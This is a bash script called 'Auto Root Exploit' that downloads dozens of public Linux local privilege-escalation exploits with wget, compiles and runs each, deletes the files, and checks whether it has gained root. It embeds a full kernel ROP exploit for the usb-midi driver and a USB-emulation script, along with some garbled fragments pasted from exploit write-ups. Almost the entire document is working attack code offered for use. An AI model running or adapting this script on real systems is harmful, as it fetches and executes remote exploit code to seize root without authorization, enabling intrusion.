#!/bin/bash

#All exploits are suggested by "exploitdb" and will update according to it.
#Name     : Auto Root
#Author   : Nilotpal Biswas
#Facebook : https://www.facebook.com/nilotpal.biswas.73
#Twitter  : https://twitter.com/nilotpalhacker
#USAGE    : bash autoroot.sh

echo "==================================================="
echo "              Auto Root Exploit v2.0"
echo "                by Nilotpal Biswas"
echo "==================================================="

checkroot() {
if [ $(id -u) == 0 ]; then
echo
echo "Successfully R00T(ed).. have fun :)"
id=$(id)
echo "ID     => " $id
who=$(whoami)
echo "WHOAMI => " $who
exit
else
echo ""
echo "R00Ting.. wait"
sleep 1
fi
}
ccmpl(){
gcc exploit.c -lutil -lpthread
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc exploit.c -m32 -O2 -o exploit
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc exploit.c -O2 -o exploit
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc exploit.c -o exploit
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc exploit.c -o exploit -lkeyutils -Wall
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc exploit.c -o exploit -lpthread
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc exploit.c -o exploit -pthread
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc exploit.c -o exploit -static -Wall
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc exploit.c -o exploit -Wall
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc -fPIC -shared -o exploit exploit.c -ldl -w
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc -O2 exploit.c
gcc -O2 -fomit-frame-pointer exploit.c -o exploit
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc -o exploit exploit.c
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc -o exploit exploit.c -static -O2
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc -pthread exploit.c -o exploit -lcrypt
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc -Wall -m64 -o exploit exploit.c
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
gcc -Wall -o exploit exploit.c
./exploit
./a.out
rm exploit
rm exploit.c
rm a.out
checkroot;
}
shcmpl(){
bash exploit.sh
rm exploit.sh
rm *.c
checkroot;
}
pycmpl(){
python exploit.py
rm exploit.py
rm *.c
checkroot;
}
echo "Auto R00Ting start..."

checkroot;
#c
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2031.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/17391.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/18411.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/33321.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/35161.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_x86-64/local/40871.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/5092.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/8572.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_x86/local/9542.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/25202.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/33322.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/40812.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/37292.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2013.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/5093.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/8673.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/10613.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/40003.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2004.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_x86-64/local/15024.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15704.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/25444.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/30604.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/33824.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/41994.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2005.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/41995.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2006.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/40616.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_x86-64/local/24746.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/33336.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_x86-64/local/33516.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/39166.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/41886.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/1397.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/27297.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_x86-64/local/31347.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/39277.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/718.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/8678.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/41458.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/40839.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_x86-64/local/33589.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_x86-64/local/40049.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/35370.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/38390.c -O exploit.c
ccmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/39230.c -O exploit.c
ccmpl;

#sh
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2011.sh -O exploit.sh
shcmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/8478.sh -O exploit.sh
shcmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/10018.sh -O exploit.sh
shcmpl;

#py
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/9844.py -O exploit.py
pycmpl;
wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/12130.py -O exploit.py
pycmpl;

#txt
#platforms/linux/local/9191.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9191.tgz
tar -zxf 9191.tgz
cd cheddar_bay
bash cheddar_bay.sh
cc -fno-stack-protector -o exploit exploit.c
./exploit
cc -fno-stack-protector -DRHEL5_SUCKS -o exploit exploit.c
./exploit
cd ..
rm -rf cheddar_bay
rm -rf 9191.tgz
tar -zxf 33395.tgz
cd ext4_own
bash ext4_own.sh
cd ..
rm -rf ext4_own
rm -rf 33395.tgz
checkroot;
#platforms/linux/local/39772.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
cd 39772
unzip 39772.zip
tar -xf exploit.tar
cd ebpf_mapfd_doubleput_exploit
bash compile.sh
./hello
./doubleput
./suidhelper
cd ..
rm -rf ebpf_mapfd_doubleput_exploit
rm -rf exploit.tar
checkroot;
tar -xf crasher.tar
cd ebpf_mapfd_doubleput_crasher
bash compile.sh
./doubleput
cd ..
rm -rf ebpf_mapfd_doubleput_crasher
rm -rf 39772
rm -rf 39772.zip
checkroot;
#platforms/linux/local/23674.txt
smbmount --version
ls -l /usr/bin/smbmount
ls -l /usr/bin/smbmnt
cat a.c
main()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
make a
cc a.c -o a
chmod +s a
share:/etc/samba/smb.conf
/etc/samba/smb.conf
[share]
path = /data/share
writable = no
locking = no
public = yes
guest ok = yes
comment = Share
ls -l a
ls -l pokus/a
id
checkroot;
#platforms/linux/local/29714.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/29714.tgz
tar -zxf 29714.tgz
cd exploit
make
make install
cd ..
rm -rf exploit
rm -rf 29714.tgz
checkroot;
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9191.tgz
tar -zxf 9191.tgz
cd cheddar_bay
bash cheddar_bay.sh
cc -fno-stack-protector -o exploit exploit.c
./exploit
cc -fno-stack-protector -DRHEL5_SUCKS -o exploit exploit.c
./exploit
cd ..
rm -rf cheddar_bay
rm -rf 9191.tgz
tar -zxf 33395.tgz
cd ext4_own
bash ext4_own.sh
cd ..
rm -rf ext4_own
rm -rf 33395.tgz
checkroot;
#platforms/linux/local/33395.txt
wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/33395.tgz
tar -zxf 33395.tgz
cd ext4_own
bash ext4_own.sh
checkroot;
cd ..
rm -rf ext4_own
rm -rf 33395.tgz
#platforms/linux/local/40489.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40489.zip
unzip 40489.zip
cd 40489
bash compile.sh
./pwn
./enjoy
cd ..
rm -rf 40489
rm -rf 40489.zip
checkroot;
#platforms/linux/local/41770.txt
#!/bin/bash
(./ProcReadHelper /proc/$$/syscall) &
sleep 1
exec /usr/bin/passwd
#!/bin/bash
echo "Current pid is $$"
(sleep 10; echo 127 ) > /proc/$$/coredump_filter &
sleep 5
exec /usr/bin/passwd
static ssize_t mem_read(struct file * file, char __user * buf,
                        size_t count, loff_t *ppos) {
    if (file->private_data != (void*)((long)current->self_exec_id))
        goto out_put;
#!/bin/bash
(sleep 3; echo 15) > /proc/$$/oom_adj &
exec /usr/bin/passwd
checkroot;
#platforms/linux/local/38559.txt
rmmod b43
modprobe b43 fwpostfix=AA%xBB
dmesg
checkroot;
#platforms/linux/local/41999.txt
cat > poc.c << __EOF__
// A part of the proof-of-concept exploit for the vulnerability in the usb-midi
// driver. Meant to be used in conjuction with a hardware usb emulator, which
// emulates a particular malicious usb device (a Facedancer21 for example).
//
// Andrey Konovalov <andreyknvl@gmail.com>
//
// Usage:
//    // Edit source to set addresses of the kernel symbols and the ROP gadgets.
//    $ gcc poc.c -masm=intel
//    // Run N instances of the binary with the argument increasing from 0 to N,
//    // where N is the number of cpus on your machine.
//    $ ./a.out 0 & ./a.out 1 & ...
//    [+] starting as: uid=1000, euid=1000
//    [+] payload addr: 0x400b60
//    [+] fake stack mmaped
//    [+] plug in the usb device...
//    // Now plug in the device a few times.
//    // In one of the instances you will get (if the kernel doesn't crash):
//    [+] got r00t: uid=0, euid=0
//    # id
//    uid=0(root) gid=0(root) groups=0(root)
#define _GNU_SOURCE
#include <netinet/ip.h>
#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
// You need to set these based on your kernel.
// To easiest way to obtain the addresses of commit_creds and prepare_kernel_cred
// is to boot your kernel and grep /proc/kallsyms for them.
// The easiest way to obtain the gadgets addresses is to use the ROPgadget util.
// Note that all of the used gadgets must preserve the initial value of the rbp
// register, since this value is used later on to restore rsp.
// The value of CR4_DESIRED_VALUE must have the SMEP bit disabled.
#define COMMIT_CREDS              0xffffffff810957e0L
#define PREPARE_KERNEL_CRED       0xffffffff81095ae0L
#define XCHG_EAX_ESP_RET          0xffffffff8100008aL
#define POP_RDI_RET               0xffffffff8118991dL
#define MOV_DWORD_PTR_RDI_EAX_RET 0xffffffff810fff17L
#define MOV_CR4_RDI_RET           0xffffffff8105b8f0L
#define POP_RCX_RET               0xffffffff810053bcL
#define JMP_RCX                   0xffffffff81040a90L
#define CR4_DESIRED_VALUE         0x407f0
// Payload. Saves eax, which holds the 32 lower bits of the old esp value,
// disables SMEP, restores rsp, obtains root, jumps back to the caller.
#define CHAIN_SAVE_EAX                  \
  *stack++ = POP_RDI_RET;               \
  *stack++ = (uint64_t)&saved_eax;      \
  *stack++ = MOV_DWORD_PTR_RDI_EAX_RET;
#define CHAIN_SET_CR4                   \
  *stack++ = POP_RDI_RET;               \
  *stack++ = CR4_DESIRED_VALUE;         \
  *stack++ = MOV_CR4_RDI_RET;           \
#define CHAIN_JMP_PAYLOAD               \
  *stack++ = POP_RCX_RET;               \
  *stack++ = (uint64_t)&payload;        \
  *stack++ = JMP_RCX;                   \
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
void get_root(void) {
  commit_creds(prepare_kernel_cred(0));
}
uint64_t saved_eax;
// Unfortunately GCC does not support `__atribute__((naked))` on x86, which
// can be used to omit a function's prologue, so I had to use this weird
// wrapper hack as a workaround. Note: Clang does support it, which means it
// has better support of GCC attributes than GCC itself. Funny.
void wrapper() {
  asm volatile ("                         \n\
    payload:                              \n\
      movq %%rbp, %%rax                   \n\
      movq $0xffffffff00000000, %%rdx     \n\
      andq %%rdx, %%rax                   \n\
      movq %0, %%rdx                      \n\
      addq %%rdx, %%rax                   \n\
      movq %%rax, %%rsp                   \n\
      jmp get_root                        \n\
  " : : "m"(saved_eax) : );
}

void payload();

// Kernel structs.

struct ubuf_info {
  uint64_t callback;        // void (*callback)(struct ubuf_info *, bool)
  uint64_t ctx;             // void *
  uint64_t desc;            // unsigned long
};

struct skb_shared_info {
  uint8_t  nr_frags;        // unsigned char
  uint8_t  tx_flags;        // __u8
  uint16_t gso_size;        // unsigned short
  uint16_t gso_segs;        // unsigned short
  uint16_t gso_type;        // unsigned short
  uint64_t frag_list;       // struct sk_buff *
  uint64_t hwtstamps;       // struct skb_shared_hwtstamps
  uint32_t tskey;           // u32
  uint32_t ip6_frag_id;     // __be32
  uint32_t dataref;         // atomic_t
  uint64_t destructor_arg;  // void *
  uint8_t  frags[16][17];   // skb_frag_t frags[MAX_SKB_FRAGS];
};

#define MIDI_MAX_ENDPOINTS 2

struct snd_usb_midi {
  uint8_t bullshit[240];

  struct snd_usb_midi_endpoint {
    uint64_t out;           // struct snd_usb_midi_out_endpoint *
    uint64_t in;            // struct snd_usb_midi_in_endpoint *
  } endpoints[MIDI_MAX_ENDPOINTS];

  // More bullshit.
};

// Init buffer for overwriting a skbuff object.

struct ubuf_info ui;

void init_buffer(char* buffer) {
  struct skb_shared_info *ssi = (struct skb_shared_info *)&buffer[192];
  struct snd_usb_midi *midi = (struct snd_usb_midi *)&buffer[0];
  int i;

  ssi->tx_flags = 0xff;
  ssi->destructor_arg = (uint64_t)&ui;
  ui.callback = XCHG_EAX_ESP_RET;

  // Prevents some crashes.
  ssi->nr_frags = 0;

  // Prevents some crashes.
  ssi->frag_list = 0;

  // Prevents some crashes.
  for (i = 0; i < MIDI_MAX_ENDPOINTS; i++) {
    midi->endpoints.out = 0;
    midi->endpoints.in = 0;
  }
}

// Map a fake stack where the ROP payload resides.

void mmap_stack() {
  uint64_t stack_addr;
  int stack_offset;
  uint64_t* stack;
  int page_size;

  page_size = getpagesize();

  stack_addr = (XCHG_EAX_ESP_RET & 0x00000000ffffffffL) & ~(page_size - 1);
  stack_offset = XCHG_EAX_ESP_RET % page_size;

  stack = mmap((void *)stack_addr, page_size, PROT_READ | PROT_WRITE,
      MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if (stack == MAP_FAILED) {
    perror("[-] mmap()");
    exit(EXIT_FAILURE);
  }
  stack = (uint64_t *)((char *)stack + stack_offset);
  CHAIN_SAVE_EAX;
  CHAIN_SET_CR4;
  CHAIN_JMP_PAYLOAD;
}
// Sending control messages.
int socket_open(int port) {
  int sock;
  struct sockaddr_in sa;
  sock = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock == -1) {
    perror("[-] socket()");
    exit(EXIT_FAILURE);
  }
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  sa.sin_port = htons(port);
  if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
    perror("[-] connect()");
    exit(EXIT_FAILURE);
  }

  return sock;
}

void socket_close(int sock) {
  close(sock);
}

void socket_sendmmsg(int sock) {
  struct mmsghdr msg[1];
  struct iovec msg2;
  int rv;
  char buffer[512];

  memset(&msg2, 0, sizeof(msg2));
  msg2.iov_base = &buffer[0];
  msg2.iov_len = 512;

  memset(msg, 0, sizeof(msg));
  msg[0].msg_hdr.msg_iov = &msg2;
  msg[0].msg_hdr.msg_iovlen = 1;

  memset(&buffer[0], 0xa1, 512);

  struct cmsghdr *hdr = (struct cmsghdr *)&buffer[0];
  hdr->cmsg_len = 512;
  hdr->cmsg_level = SOL_IP + 1;

  init_buffer(&buffer[0]);

  msg[0].msg_hdr.msg_control = &buffer[0];
  msg[0].msg_hdr.msg_controllen = 512;

  rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
  if (rv == -1) {
    perror("[-] sendmmsg()");
    exit(EXIT_FAILURE);
  }
}

// Allocating and freeing skbuffs.

struct sockaddr_in server_si_self;

struct sockaddr_in client_si_other;

int init_server(int port) {
  int sock;
  int rv;

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock == -1) {
    perror("[-] socket()");
    exit(EXIT_FAILURE);
  }

  memset(&server_si_self, 0, sizeof(server_si_self));
  server_si_self.sin_family = AF_INET;
  server_si_self.sin_port = htons(port);
  server_si_self.sin_addr.s_addr = htonl(INADDR_ANY);

  rv = bind(sock, (struct sockaddr *)&server_si_self,
      sizeof(server_si_self));
  if (rv == -1) {
    perror("[-] bind()");
    exit(EXIT_FAILURE);
  }

  return sock;
}

int init_client(int port) {
  int sock;
  int rv;

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock == -1) {
    perror("[-] socket()");
    exit(EXIT_FAILURE);
  }

  memset(&client_si_other, 0, sizeof(client_si_other));
  client_si_other.sin_family = AF_INET;
  client_si_other.sin_port = htons(port);

  rv = inet_aton("127.0.0.1", &client_si_other.sin_addr);
  if (rv == 0) {
    perror("[-] inet_aton()");
    exit(EXIT_FAILURE);
  }

  return sock;
}

void client_send_message(int sock) {
  int rv;
  // Messages of 128 bytes result in 512 bytes skbuffs.
  char sent_message[128] = { 0x10 };

  rv = sendto(sock, &sent_message[0], 128, 0,
    (struct sockaddr *)&client_si_other,
    sizeof(client_si_other));
  if (rv == -1) {
    perror("[-] sendto()");
    exit(EXIT_FAILURE);
  }
}

void destroy_server(int sock) {
  close(sock);
}

void destroy_client(int sock) {
  close(sock);
}

// Checking root.

void exec_shell() {
  char *args[] = {"/bin/sh", "-i", NULL};
  execve("/bin/sh", args, NULL);
}

void fork_shell() {
  pid_t rv;

  rv = fork();
  if (rv == -1) {
    perror("[-] fork()");
    exit(EXIT_FAILURE);
  }

  if (rv == 0) {
    exec_shell();
  }

  while (true) {
    sleep(1);
  }
}

bool is_root() {
  return getuid() == 0;
}

void check_root() {
  if (!is_root())
    return;

  printf("[+] got r00t: uid=%d, euid=%d\n", getuid(), geteuid());

  // Fork and exec instead of just doing the exec to avoid freeing skbuffs
  // and prevent some crashes due to a allocator corruption.
  fork_shell();
}

// Main.

#define PORT_BASE_1 4100
#define PORT_BASE_2 4200
#define PORT_BASE_3 4300

#define SKBUFFS_NUM 64
#define MMSGS_NUM 256

int server_sock;
int client_sock;

void step_begin(int id) {
  int i;

  server_sock = init_server(PORT_BASE_2 + id);
  client_sock = init_client(PORT_BASE_2 + id);

  for (i = 0; i < SKBUFFS_NUM; i++) {
    client_send_message(client_sock);
  }

  for (i = 0; i < MMSGS_NUM; i++) {
    int sock = socket_open(PORT_BASE_3 + id);
    socket_sendmmsg(sock);
    socket_close(sock);
  }
}

void step_end(int id) {
  destroy_server(server_sock);
  destroy_client(client_sock);
}

void body(int id) {
  int server_sock, client_sock, i;

  server_sock = init_server(PORT_BASE_1 + id);
  client_sock = init_client(PORT_BASE_1 + id);

  for (i = 0; i < 512; i++)
    client_send_message(client_sock);

  while (true) {
    step_begin(id);
    check_root();
    step_end(id);
  }
}

bool parse_int(const char *input, int *output) {
  char* wrong_token = NULL;
  int result = strtol(input, &wrong_token, 10);
  if (*wrong_token != '\0') {
    return false;
  }
  *output = result;
  return true;
}

int main(int argc, char **argv) {
  bool rv;
  int id;

  if (argc != 2) {
    printf("Usage: %s <instance_id>\n", argv[0]);
    return EXIT_SUCCESS;
  }

  rv = parse_int(argv[1], &id);
  if (!rv) {
    printf("Usage: %s <instance_id>\n", argv[0]);
    return EXIT_SUCCESS;
  }

  printf("[+] starting as: uid=%d, euid=%d\n", getuid(), geteuid());

  printf("[+] payload addr: %p\n", &payload);

  mmap_stack();
  printf("[+] fake stack mmaped\n");

  printf("[+] plug in the usb device...\n");

  body(id);

  return EXIT_SUCCESS;
}

__EOF__
gcc poc.c -masm=intel
./a.out 0
checkroot;
./a.out 1
checkroot;
./a.out 2
checkroot;
./a.out 3
checkroot;
./a.out 4
checkroot;
./a.out 5
checkroot;
./a.out 6
checkroot;
./a.out 7
checkroot;
./a.out 8
checkroot;
./a.out 9
checkroot;
./a.out 10
checkroot;
rm a.out
rm poc.c
cat > poc.py << __EOF__
#!/usr/bin/env python3

# A part of the proof-of-concept exploit for the vulnerability in the usb-midi
# driver. Can be used on it's own for a denial of service attack. Should be
# used in conjuction with a userspace part for an arbitrary code execution
# attack.
#
# Requires a Facedancer21 board
# (http://goodfet.sourceforge.net/hardware/facedancer21/).
#
# Andrey Konovalov <anreyknvl@gmail.com>

from USB import *
from USBDevice import *
from USBConfiguration import *
from USBInterface import *

class PwnUSBDevice(USBDevice):
    name = "USB device"

    def __init__(self, maxusb_app, verbose=0):
        interface = USBInterface(
                0,                      # interface number
                0,                      # alternate setting
                255,                    # interface class
                0,                      # subclass
                0,                      # protocol
                0,                      # string index
                verbose,
                [],
                {}
        )

        config = USBConfiguration(
                1,                      # index
                "Emulated Device",      # string desc
                [ interface ]           # interfaces
        )

        USBDevice.__init__(
                self,
                maxusb_app,
                0,                      # device class
                0,                      # device subclass
                0,                      # protocol release number
                64,                     # max packet size for endpoint 0
                0x0763,                 # vendor id
                0x1002,                 # product id
                0,                      # device revision
                "Midiman",              # manufacturer string
                "MidiSport 2x2",        # product string
                "?",                    # serial number string
                [ config ],
                verbose=verbose
        )

from Facedancer import *
from MAXUSBApp import *

sp = GoodFETSerialPort()
fd = Facedancer(sp, verbose=1)
u = MAXUSBApp(fd, verbose=1)

d = PwnUSBDevice(u, verbose=4)

d.connect()

try:
    d.run()
except KeyboardInterrupt:
    d.disconnect()
__EOF__
python poc.py
checkroot;
rm poc.py
rm a.out
rm exploit

echo
echo "Srry.. I tried hard, but no luck this time.. Wait for update :("
